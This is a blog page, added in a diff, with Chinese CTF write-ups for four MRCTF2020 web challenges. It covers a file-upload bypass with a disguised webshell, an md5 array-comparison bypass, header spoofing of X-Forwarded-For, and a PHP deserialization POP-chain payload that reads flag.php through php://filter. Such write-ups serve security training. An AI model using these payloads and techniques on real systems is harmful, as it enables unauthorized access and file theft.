@@ -1,0 +1,162 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author"><title>writeup · Mashiroの小站</title><meta name="description" content="[MRCTF2020] 你传你🐎呢#知识点#
+.htaccess上传绕过
+
+解题#传.htaccess发现不太行，burp修改Content-Type为Image/jpeg成功上传，再上传一张jpg马就能直接连上了
+[MRCTF2020] Ez_bypass#知识点#
+md5比较漏洞
+数字截取
+
+"><meta name="keywords" content=""><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/bootstrap.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/style-dark.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 5.1.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div id="stage" class="container"><div class="row"><div id="side-bar" class="col-sm-3 col-xs-12 side-container invisible"><div class="vertical-text site-title"><h3 tabindex="-1" class="site-title-small"><a href="/" class="a-title">Typography</a></h3><h1 tabindex="-1" class="site-title-large"><a href="/" class="a-title">Sakamoto</a></h1><!--h6(onclick="triggerSiteNav()") Trigger--></div><br class="visible-lg visible-md visible-sm"><div id="site-nav" class="site-title-links"><ul><li><a href="/">Home</a></li><li><a href="/archives">Archive</a></li><li><a href="/categories">Categories</a></li><li><a href="/tags">Tags</a></li><li><a href="/categories/index.html">categories</a></li><li><a href="/leetcode/index.html">leetcode</a></li><li><a href="/tags/index.html">tags</a></li><li><a href="/writeup/SUCTF_2018.html">writeup</a></li><li><a href="/writeup/SUCTF_2019.html">writeup</a></li><li><a href="/writeup/index.html" class="current">writeup</a></li><li><a href="/writeup/MRCTF_2020.html" class="current">writeup</a></li><li class="soc"><a href="https://github.com/mashiro01" target="_blank" rel="noopener noreferrer"><i class="fa fa-github">&nbsp;</i></a><a href="https://mashiro01.github.io/atom.xml" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss">&nbsp;</i></a></li></ul><div class="visible-lg visible-md visible-sm site-nav-footer"><br class="site-nav-footer-br"><footer><p>&copy;&nbsp;2020&nbsp;<a target="_blank" href="https://mashiro01.github.io" rel="noopener noreferrer">Mashiroi</a></p><p>Theme&nbsp;<a target="_blank" href="https://github.com/SumiMakito/hexo-theme-typography" rel="noopener noreferrer">Typography</a>&nbsp;by&nbsp;<a target="_blank" href="https://www.keep.moe" rel="noopener noreferrer">Makito</a></p><p>Proudly published with&nbsp;<a target="_blank" href="https://hexo.io" rel="noopener noreferrer">Hexo</a></p></footer></div></div></div><div id="main-container" class="col-sm-9 col-xs-12 main-container invisible"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post-container"><p class="post-title"><a>writeup</a></p><p class="post-meta"><span class="date meta-item">Posted at&nbsp;2020-09-05</span><span class="meta-item"><i class="fa fa-comment-o"></i><span>&nbsp;</span><a href="/writeup/MRCTF_2020.html#comments">Comments</a></span></p><p class="post-abstract"><h2><span id="mrctf2020-ni-chuan-ni-ni">[MRCTF2020] 你传你🐎呢</span><a href="#mrctf2020-ni-chuan-ni-ni" class="header-anchor">#</a></h2><h3><span id="zhi-shi-dian">知识点</span><a href="#zhi-shi-dian" class="header-anchor">#</a></h3><ol>
+<li>.htaccess上传绕过</li>
+</ol>
+<h3><span id="jie-ti">解题</span><a href="#jie-ti" class="header-anchor">#</a></h3><p>传<code>.htaccess</code>发现不太行，burp修改<code>Content-Type</code>为<code>Image/jpeg</code>成功上传，再上传一张jpg马就能直接连上了</p>
+<h2><span id="mrctf2020-ez-bypass">[MRCTF2020] Ez_bypass</span><a href="#mrctf2020-ez-bypass" class="header-anchor">#</a></h2><h3><span id="zhi-shi-dian">知识点</span><a href="#zhi-shi-dian" class="header-anchor">#</a></h3><ol>
+<li>md5比较漏洞</li>
+<li>数字截取</li>
+</ol>
+<h3><span id="jie-ti">解题</span><a href="#jie-ti" class="header-anchor">#</a></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">include &#39;flag.php&#39;;
+$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
+if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;
+    $id&#x3D;$_GET[&#39;id&#39;];
+    $gg&#x3D;$_GET[&#39;gg&#39;];
+    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;
+        echo &#39;You got the first step&#39;;
+        if(isset($_POST[&#39;passwd&#39;])) &#123;
+            $passwd&#x3D;$_POST[&#39;passwd&#39;];
+            if (!is_numeric($passwd))
+            &#123;
+                 if($passwd&#x3D;&#x3D;1234567)
+                 &#123;
+                     echo &#39;Good Job!&#39;;
+                     highlight_file(&#39;flag.php&#39;);
+                     die(&#39;By Retr_0&#39;);
+                 &#125;
+                 else
+                 &#123;
+                     echo &quot;can you think twice??&quot;;
+                 &#125;
+            &#125;
+            else&#123;
+                echo &#39;You can not get it !&#39;;
+            &#125;
+
+        &#125;
+        else&#123;
+            die(&#39;only one way to get the flag&#39;);
+        &#125;
+&#125;
+    else &#123;
+        echo &quot;You are not a real hacker!&quot;;
+    &#125;
+&#125;
+else&#123;
+    die(&#39;Please input first&#39;);
+&#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)<br>GET: id[]=1&amp;gg[]=2</p>
+<p>passwd -&gt; is_numeric -&gt; ==1234567<br>POST: passwd=123456a</p>
+</blockquote>
+<h2><span id="mrctf2020-pywebsite">[MRCTF2020] PYWebsite</span><a href="#mrctf2020-pywebsite" class="header-anchor">#</a></h2><h3><span id="jie-ti">解题</span><a href="#jie-ti" class="header-anchor">#</a></h3><p>直接看源码，访问flag.php，看到这句话</p>
+<blockquote>
+<p>验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag</p>
+</blockquote>
+<p>显然直接把<code>X-Forwarded-For</code>改成<code>127.0.0.1</code>就行了</p>
+<h2><span id="ezpop">Ezpop</span><a href="#ezpop" class="header-anchor">#</a></h2><h3><span id="jie-ti">解题</span><a href="#jie-ti" class="header-anchor">#</a></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+&#x2F;&#x2F;flag is in flag.php
+&#x2F;&#x2F;WTF IS THIS?
+&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+&#x2F;&#x2F;And Crack It!
+class Modifier &#123;
+    protected  $var;
+    public function append($value)&#123;
+        include($value);
+    &#125;
+    public function __invoke()&#123;
+        $this-&gt;append($this-&gt;var);
+    &#125;
+&#125;
+
+class Show&#123;
+    public $source;
+    public $str;
+    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;
+        $this-&gt;source &#x3D; $file;
+        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+    &#125;
+    public function __toString()&#123;
+        return $this-&gt;str-&gt;source;
+    &#125;
+
+    public function __wakeup()&#123;
+        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;
+            echo &quot;hacker&quot;;
+            $this-&gt;source &#x3D; &quot;index.php&quot;;
+        &#125;
+    &#125;
+&#125;
+
+class Test&#123;
+    public $p;
+    public function __construct()&#123;
+        $this-&gt;p &#x3D; array();
+    &#125;
+
+    public function __get($key)&#123;
+        $function &#x3D; $this-&gt;p;
+        return $function();
+    &#125;
+&#125;
+
+if(isset($_GET[&#39;pop&#39;]))&#123;
+    @unserialize($_GET[&#39;pop&#39;]);
+&#125;
+else&#123;
+    $a&#x3D;new Show;
+    highlight_file(__FILE__);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>先分析下线索</p>
+<ol>
+<li>Modifier类中有<code>__invoke</code>方法，可以尝试用函数的方式调用这个类来触发</li>
+<li>Show中有一个<code>__toString</code>，再看到__construct方法中能用<code>echo</code>调用<code>$this -&gt; source</code>，可以确定用自身调用自身来触发这个方法</li>
+<li>Test中有<code>__get</code>，再加上Modifier中有一个protected属性的变量，确定用这个方法来访问<code>$var</code></li>
+<li>include能够用伪协议的方式来读取文件</li>
+</ol>
+<p>总结以上，写出调用链</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+class Modifier &#123;
+  protected  $var &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;
+&#125;
+
+class Show&#123;
+  public $source;
+  public $str;
+  public function __construct($file&#x3D;&#39;index.php&#39;)&#123;
+      $this-&gt;source &#x3D; $file;
+  &#125;
+  public function __toString()&#123;
+      return $this-&gt;str-&gt;source;
+  &#125;
+&#125;
+
+class Test&#123;
+  public $p;
+&#125;
+
+$a &#x3D; new Show(&quot;test&quot;);
+$a -&gt; str &#x3D; new Test();
+$a -&gt; str -&gt; p &#x3D; new Modifier();
+$b &#x3D; new Show($a);
+
+echo urlencode(serialize($b));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</p></div><a id="comments"></a><div id="disqus_thread"></div><script>var disqus_shortname = 'mashiro01';
+var disqus_identifier = 'writeup/MRCTF_2020.html';
+var disqus_title = 'writeup';
+var disqus_url = 'https://mashiro01.github.io/writeup/MRCTF_2020.html';
+(function () {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();</script><script id="dsq-count-scr" src="//mashiro01.disqus.com/count.js" async></script></div></div></div><div class="visible-xs site-bottom-footer"><footer><p>&copy;&nbsp;2020&nbsp;<a target="_blank" href="https://mashiro01.github.io" rel="noopener noreferrer">Mashiroi</a></p><p>Theme&nbsp;<a target="_blank" href="https://github.com/SumiMakito/hexo-theme-typography" rel="noopener noreferrer">Typography</a>&nbsp;by&nbsp;<a target="_blank" href="https://www.keep.moe" rel="noopener noreferrer">Makito</a></p><p>Proudly published with&nbsp;<a target="_blank" href="https://hexo.io" rel="noopener noreferrer">Hexo</a></p></footer></div></div></div></div><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/bootstrap.min.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/google-analytics.js"></script><script src="/js/typography.js"></script></body></html>
